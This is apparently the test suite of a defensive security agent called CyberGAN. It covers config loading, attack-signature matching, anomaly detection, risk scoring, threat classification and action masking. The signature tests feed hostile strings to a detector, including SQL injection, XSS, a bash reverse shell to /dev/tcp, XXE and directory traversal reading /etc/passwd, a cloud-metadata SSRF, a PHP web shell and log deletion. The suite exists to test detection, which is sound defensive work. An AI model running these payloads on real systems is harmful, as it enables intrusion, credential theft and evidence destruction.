"""
CyberGAN — Test Suite
Tests for perception, analysis, brain, and action modules.
"""

import time
import numpy as np
import pytest


# ─────────────────────────────────────────────
# Config Tests
# ─────────────────────────────────────────────

class TestConfig:
    def test_default_config(self):
        from cybergan.config import CyberGANConfig
        config = CyberGANConfig.default()
        assert config.agent.mode == "hybrid"
        assert config.agent.name == "CyberGAN-Agent"
        assert config.perception.log_monitor.enabled is True

    def test_yaml_config(self, tmp_path):
        from cybergan.config import CyberGANConfig
        # Write a minimal YAML
        yaml_path = tmp_path / "test.yaml"
        yaml_path.write_text("agent:\n  mode: advisory\n  name: test-agent\n")

        config = CyberGANConfig.from_yaml(str(yaml_path))
        assert config.agent.mode == "advisory"
        assert config.agent.name == "test-agent"

    def test_config_file_not_found(self):
        from cybergan.config import CyberGANConfig
        with pytest.raises(FileNotFoundError):
            CyberGANConfig.from_yaml("/nonexistent/path.yaml")


# ─────────────────────────────────────────────
# Attack Signature Tests
# ─────────────────────────────────────────────

class TestAttackSignatures:
    def test_sqli_union(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("UNION SELECT * FROM users")
        assert len(matches) > 0
        assert any("SQLi" in sig.name for sig, _ in matches)

    def test_sqli_boolean(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("' OR 1=1 --")
        assert len(matches) > 0

    def test_sqli_time_based(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("'; SLEEP(5)--")
        assert len(matches) > 0

    def test_xss_script_tag(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text('<script>alert("xss")</script>')
        assert len(matches) > 0
        assert any("XSS" in sig.name for sig, _ in matches)

    def test_xss_event_handler(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text('onload=alert(document.cookie)')
        assert len(matches) > 0

    def test_command_injection(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("; cat /etc/passwd")
        assert len(matches) > 0
        assert any(sig.attack_type.value == "command_injection" for sig, _ in matches)

    def test_reverse_shell(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert len(matches) > 0

    def test_directory_traversal(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("../../etc/passwd")
        assert len(matches) > 0

    def test_xxe(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text('<!ENTITY xxe SYSTEM "file:///etc/passwd">')
        assert len(matches) > 0

    def test_ssrf(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("url=http://169.254.169.254/latest/meta-data/")
        assert len(matches) > 0

    def test_web_shell(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("system($_GET['cmd'])")
        assert len(matches) > 0

    def test_cryptominer(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("stratum+tcp://pool.minexmr.com")
        assert len(matches) > 0

    def test_log_tampering(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("rm -rf /var/log/auth.log")
        assert len(matches) > 0

    def test_scanner_detection(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("sqlmap/1.5")
        assert len(matches) > 0

    def test_no_false_positive_normal(self):
        from cybergan.analysis.attack_signatures import scan_text
        matches = scan_text("Hello, welcome to our website!")
        assert len(matches) == 0

    def test_request_scan(self):
        from cybergan.analysis.attack_signatures import scan_request
        results = scan_request(
            method="GET",
            path="/search",
            query="q=1' UNION SELECT * FROM users--",
        )
        assert len(results) > 0
        assert any(sig.attack_type.value == "sql_injection" for sig, _, _ in results)


# ─────────────────────────────────────────────
# Feature Extractor Tests
# ─────────────────────────────────────────────

class TestFeatureExtractor:
    def test_empty_state(self):
        from cybergan.analysis.feature_extractor import FeatureExtractor, OBSERVATION_DIM
        fe = FeatureExtractor()
        state = fe.extract()
        assert state.observation.shape == (OBSERVATION_DIM,)
        assert state.total_events == 0

    def test_with_events(self):
        from cybergan.analysis.feature_extractor import FeatureExtractor
        from cybergan.perception.log_monitor import LogEvent

        fe = FeatureExtractor()
        event = LogEvent(
            timestamp=time.time(),
            source_file="/var/log/auth.log",
            raw_line="Failed password for root from 10.0.0.1",
            event_type="failed_login",
            severity="warning",
            source_ip="10.0.0.1",
        )
        fe.add_event(event)
        state = fe.extract()
        assert state.total_events == 1
        assert state.unique_attackers == 1

    def test_observation_dim(self):
        from cybergan.analysis.feature_extractor import FeatureExtractor, OBSERVATION_DIM
        fe = FeatureExtractor()
        assert fe.get_observation_dim() == OBSERVATION_DIM
        assert OBSERVATION_DIM == 65


# ─────────────────────────────────────────────
# Anomaly Detector Tests
# ─────────────────────────────────────────────

class TestAnomalyDetector:
    def test_no_alert_without_baseline(self):
        from cybergan.config import AnomalyDetectorConfig
        from cybergan.analysis.anomaly_detector import AnomalyDetector

        ad = AnomalyDetector(AnomalyDetectorConfig(min_samples_for_baseline=10))
        # Not enough samples yet
        alert = ad.observe("metric", 100.0)
        assert alert is None

    def test_alert_on_anomaly(self):
        from cybergan.config import AnomalyDetectorConfig
        from cybergan.analysis.anomaly_detector import AnomalyDetector

        ad = AnomalyDetector(AnomalyDetectorConfig(
            min_samples_for_baseline=10,
            deviation_sigma=2.0,
        ))
        # Build baseline with low values
        for _ in range(50):
            ad.observe("metric", 10.0)

        # Inject massive spike
        alert = ad.observe("metric", 1000.0)
        assert alert is not None
        assert alert.severity in ("warning", "critical")

    def test_no_alert_on_normal(self):
        from cybergan.config import AnomalyDetectorConfig
        from cybergan.analysis.anomaly_detector import AnomalyDetector
        import random

        ad = AnomalyDetector(AnomalyDetectorConfig(min_samples_for_baseline=10))
        # Use slightly varied baseline (realistic data has variance)
        for i in range(50):
            ad.observe("metric", 50.0 + random.gauss(0, 2))

        alert = ad.observe("metric", 51.0)  # Normal value within range
        assert alert is None


# ─────────────────────────────────────────────
# Risk Scorer Tests
# ─────────────────────────────────────────────

class TestRiskScorer:
    def test_critical_risk(self):
        from cybergan.config import RiskScorerConfig
        from cybergan.analysis.risk_scorer import RiskScorer

        rs = RiskScorer(RiskScorerConfig())
        risk = rs.score("sql_injection", "critical", 0.95)
        assert risk.level == "critical"
        assert risk.score > 80
        assert risk.should_act is True

    def test_low_risk(self):
        from cybergan.config import RiskScorerConfig
        from cybergan.analysis.risk_scorer import RiskScorer

        rs = RiskScorer(RiskScorerConfig())
        risk = rs.score("port_scan", "low", 0.3)
        assert risk.level == "low"
        assert risk.score < 40

    def test_should_alert_threshold(self):
        from cybergan.config import RiskScorerConfig
        from cybergan.analysis.risk_scorer import RiskScorer

        rs = RiskScorer(RiskScorerConfig())
        risk = rs.score("brute_force_detected", "high", 0.8)
        assert risk.should_alert is True


# ─────────────────────────────────────────────
# Threat Classifier Tests
# ─────────────────────────────────────────────

class TestThreatClassifier:
    def test_classify_sqli(self):
        from cybergan.config import ThreatClassifierConfig
        from cybergan.analysis.threat_classifier import ThreatClassifier

        tc = ThreatClassifier(ThreatClassifierConfig())

        class MockEvent:
            event_type = "sql_injection"
            source_ip = "10.0.0.1"

        result = tc.classify(MockEvent())
        assert result.is_attack is True
        assert "T1190" in result.mitre_techniques
        assert result.kill_chain_stage != "unknown"

    def test_track_progression(self):
        from cybergan.config import ThreatClassifierConfig
        from cybergan.analysis.threat_classifier import ThreatClassifier

        tc = ThreatClassifier(ThreatClassifierConfig())

        class Event:
            def __init__(self, etype):
                self.event_type = etype
                self.source_ip = "10.0.0.1"

        # Simulate attack progression
        tc.classify(Event("port_scan"))
        tc.classify(Event("brute_force"))
        tc.classify(Event("sql_injection"))
        tc.classify(Event("web_shell"))
        tc.classify(Event("reverse_shell"))

        prog = tc.get_progression("10.0.0.1")
        assert prog is not None
        assert prog["event_count"] == 5
        assert len(prog["stages_hit"]) >= 3
        assert prog["is_advanced"] is True


# ─────────────────────────────────────────────
# Brain Tests
# ─────────────────────────────────────────────

class TestBrain:
    def test_heuristic_fallback(self):
        from cybergan.config import BrainConfig
        from cybergan.brain.policy import Brain
        from cybergan.analysis.feature_extractor import OBSERVATION_DIM

        brain = Brain(BrainConfig(model_path="/nonexistent"), OBSERVATION_DIM)
        assert brain.model_loaded is False

        obs = np.zeros(OBSERVATION_DIM, dtype=np.float32)
        action, conf, meta = brain.decide(obs, risk_score=80, event_type="sql_injection")
        assert action.name == "block_ip"
        assert meta["method"] == "heuristic"

    def test_action_space(self):
        from cybergan.brain.action_space import DEFENSE_ACTIONS, get_action_by_name

        assert len(DEFENSE_ACTIONS) == 16
        monitor = get_action_by_name("monitor")
        assert monitor is not None
        assert monitor.id == 0

        block = get_action_by_name("block_ip")
        assert block is not None

    def test_action_masker_advisory(self):
        from cybergan.brain.action_masker import ActionMasker

        masker = ActionMasker(mode="advisory")
        mask = masker.get_mask()
        # In advisory mode, only monitor and alert should be valid
        assert mask[0] == 1.0  # monitor
        assert mask[1] == 1.0  # alert
        assert mask[3] == 0.0  # block_ip should be masked

    def test_action_masker_autonomous(self):
        from cybergan.brain.action_masker import ActionMasker

        masker = ActionMasker(mode="autonomous")
        mask = masker.get_mask()
        # In autonomous mode, most actions should be available
        assert mask.sum() > 10


# ─────────────────────────────────────────────
# Exploit Catalog Tests
# ─────────────────────────────────────────────

class TestExploitCatalog:
    def test_catalog_size(self):
        from arena.vulnerabilities import EXPLOIT_CATALOG
        assert len(EXPLOIT_CATALOG) >= 60

    def test_categories_covered(self):
        from arena.vulnerabilities import EXPLOIT_CATALOG, AttackCategory

        categories_present = set(e.category for e in EXPLOIT_CATALOG.values())
        assert AttackCategory.WEB_APPLICATION in categories_present
        assert AttackCategory.NETWORK in categories_present
        assert AttackCategory.MALWARE in categories_present
        assert AttackCategory.AUTHENTICATION in categories_present
        assert AttackCategory.PRIVILEGE in categories_present
        assert AttackCategory.RECONNAISSANCE in categories_present

    def test_mitre_techniques_mapped(self):
        from arena.vulnerabilities import EXPLOIT_CATALOG, AttackTechnique

        techniques_present = set(e.technique for e in EXPLOIT_CATALOG.values())
        assert AttackTechnique.INITIAL_ACCESS in techniques_present
        assert AttackTechnique.EXECUTION in techniques_present
        assert AttackTechnique.PERSISTENCE in techniques_present
        assert AttackTechnique.PRIVILEGE_ESCALATION in techniques_present
        assert AttackTechnique.LATERAL_MOVEMENT in techniques_present

    def test_lookup_functions(self):
        from arena.vulnerabilities import get_exploit, get_exploits_by_category, AttackCategory

        exploit = get_exploit("CVE-2024-6387")
        assert exploit is not None
        assert exploit.name == "regreSSHion Race Condition"

        web_exploits = get_exploits_by_category(AttackCategory.WEB_APPLICATION)
        assert len(web_exploits) > 10


# ─────────────────────────────────────────────
# Log Monitor Tests
# ─────────────────────────────────────────────

class TestLogMonitor:
    def test_brute_force_tracker(self):
        from cybergan.perception.log_monitor import BruteForceTracker

        tracker = BruteForceTracker(threshold=3, window_s=60)
        assert tracker.record_attempt("10.0.0.1") is False
        assert tracker.record_attempt("10.0.0.1") is False
        assert tracker.record_attempt("10.0.0.1") is True  # Threshold hit
        assert tracker.is_blocked("10.0.0.1") is True
        assert tracker.is_blocked("10.0.0.2") is False

    def test_parse_ssh_failed(self):
        from cybergan.config import LogMonitorConfig
        from cybergan.perception.log_monitor import LogMonitor

        monitor = LogMonitor(LogMonitorConfig())
        event = monitor._parse_line(
            "/var/log/auth.log",
            "Jan 1 00:00:00 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2"
        )
        assert event is not None
        assert event.event_type == "failed_login"
        assert event.source_ip == "192.168.1.100"
        assert event.username == "root"

    def test_parse_sudo_command(self):
        from cybergan.config import LogMonitorConfig
        from cybergan.perception.log_monitor import LogMonitor

        monitor = LogMonitor(LogMonitorConfig())
        event = monitor._parse_line(
            "/var/log/auth.log",
            "Jan 1 00:00:00 server sudo: admin : COMMAND=/bin/bash"
        )
        assert event is not None
        assert event.event_type == "sudo_command"

    def test_parse_normal_line(self):
        from cybergan.config import LogMonitorConfig
        from cybergan.perception.log_monitor import LogMonitor

        monitor = LogMonitor(LogMonitorConfig())
        event = monitor._parse_line(
            "/var/log/syslog",
            "Jan 1 00:00:00 server systemd: Starting daily cleanup..."
        )
        assert event is None  # Normal line, not security-relevant


# ─────────────────────────────────────────────
# Online Learner Tests
# ─────────────────────────────────────────────

class TestOnlineLearner:
    def test_experience_buffer(self):
        from cybergan.healing.online_learner import ExperienceBuffer

        buffer = ExperienceBuffer(max_size=100)
        assert buffer.size == 0

        obs = np.zeros(10, dtype=np.float32)
        buffer.add_direct(obs, action_id=3, reward=1.0, next_observation=obs)
        assert buffer.size == 1

        recent = buffer.get_recent(5)
        assert len(recent) == 1
        assert recent[0].action_id == 3
        assert recent[0].reward == 1.0

    def test_reward_calculation(self):
        from cybergan.config import OnlineLearningConfig
        from cybergan.healing.online_learner import OnlineLearner

        learner = OnlineLearner(OnlineLearningConfig())
        obs = np.zeros(10, dtype=np.float32)

        learner.record_outcome(obs, action_id=3, outcome="blocked")
        assert learner.experience_buffer.size == 1
        exp = learner.experience_buffer.get_recent(1)[0]
        assert exp.reward == 5.0  # Default reward_for_blocked_attack

        learner.record_outcome(obs, action_id=3, outcome="missed")
        exp = learner.experience_buffer.get_recent(1)[0]
        assert exp.reward == -10.0  # Default reward_for_missed_attack


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
